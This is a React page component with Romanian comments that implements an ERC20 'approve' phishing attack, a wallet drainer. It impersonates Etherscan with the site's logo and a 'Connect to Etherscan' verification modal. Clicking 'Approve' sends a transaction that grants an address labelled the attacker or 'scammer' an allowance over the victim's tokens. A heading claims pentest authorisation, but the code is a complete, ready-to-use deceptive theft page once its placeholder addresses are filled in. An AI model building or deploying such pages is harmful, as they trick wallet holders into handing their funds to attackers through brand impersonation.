"use client";
import { useState } from "react";

// Pentru TypeScript, declară window.ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

// ABI pentru funcția approve (poți folosi și web3/ethers pentru encode, dar aici e hardcodat)
function getApproveData(spender: string, amount: string) {
  // selector approve(address,uint256): 0x095ea7b3
  // address (32 bytes, left-padded), amount (32 bytes, left-padded)
  return (
    "0x095ea7b3" +
    spender.replace("0x", "").padStart(64, "0") +
    BigInt(amount).toString(16).padStart(64, "0")
  );
}

export default function Home() {
  const [showModal, setShowModal] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Setează aici adresa tokenului ERC20 și adresa "scammerului" (spender)
  const tokenAddress = "0xYourTokenAddress"; // ex: USDT, USDC, DAI, etc.
  const spender = "0xAttackerAddress"; // adresa de test sau a "atacatorului"
  const amount = "1000000000000000000"; // 1 token (18 decimals)

  const handleApprove = async () => {
    setError(null);
    setTxHash(null);
    if (!window.ethereum) {
      setError("MetaMask nu este instalat.");
      return;
    }
    try {
      // 1. Cere adresa utilizatorului
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const from = accounts[0];

      // 2. Construiește data pentru approve
      const data = getApproveData(spender, amount);

      // 3. Trimite tranzacția approve
      const tx = {
        from,
        to: tokenAddress,
        data
      };

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [tx]
      });

      setTxHash(txHash);
    } catch (e: any) {
      setError(e.message || "Eroare la approve.");
    }
  };

  return (
    <div style={{ padding: 40, fontFamily: "sans-serif" }}>
      <h1>I have permission and authorized for pentest</h1>
      <button
        onClick={() => setShowModal(true)}
        style={{
          fontSize: 20,
          padding: 10,
          background: "#0070f3",
          color: "#fff",
          border: "none",
          borderRadius: 6,
          cursor: "pointer"
        }}
      >
        Connect with Etherscan
      </button>

      {showModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100vw",
            height: "100vh",
            background: "rgba(0,0,0,0.5)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000
          }}
        >
          <div
            style={{
              background: "#fff",
              borderRadius: 12,
              padding: 32,
              minWidth: 350,
              boxShadow: "0 8px 32px rgba(0,0,0,0.2)",
              textAlign: "center",
              position: "relative"
            }}
          >
            <img
              src="https://etherscan.io/images/brandassets/etherscan-logo-circle.svg"
              alt="Etherscan"
              style={{ width: 60, marginBottom: 16 }}
            />
            <h2 style={{ margin: "0 0 12px 0" }}>Connect to Etherscan</h2>
            <p style={{ color: "#444", marginBottom: 24 }}>
              Please connect your wallet to verify and continue.
            </p>
            <button
              onClick={handleApprove}
              style={{
                fontSize: 18,
                padding: "10px 24px",
                background: "#21a0f6",
                color: "#fff",
                border: "none",
                borderRadius: 6,
                cursor: "pointer"
              }}
            >
              Approve
            </button>
            <button
              onClick={() => setShowModal(false)}
              style={{
                fontSize: 16,
                padding: "8px 16px",
                background: "#eee",
                color: "#333",
                border: "none",
                borderRadius: 6,
                cursor: "pointer",
                marginLeft: 16
              }}
            >
              Cancel
            </button>
            <div style={{ position: "absolute", top: 12, right: 16, cursor: "pointer" }} onClick={() => setShowModal(false)}>
              <svg width="24" height="24" fill="#888"><path d="M18 6L6 18M6 6l12 12" stroke="#888" strokeWidth="2" strokeLinecap="round"/></svg>
            </div>
            {txHash && (
              <div style={{ marginTop: 24, wordBreak: "break-all", color: "#0a0" }}>
                <b>Approve trimis!</b>
                <div style={{ fontSize: 12 }}>{txHash}</div>
              </div>
            )}
            {error && (
              <div style={{ marginTop: 24, color: "#c00" }}>
                <b>Eroare:</b> {error}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
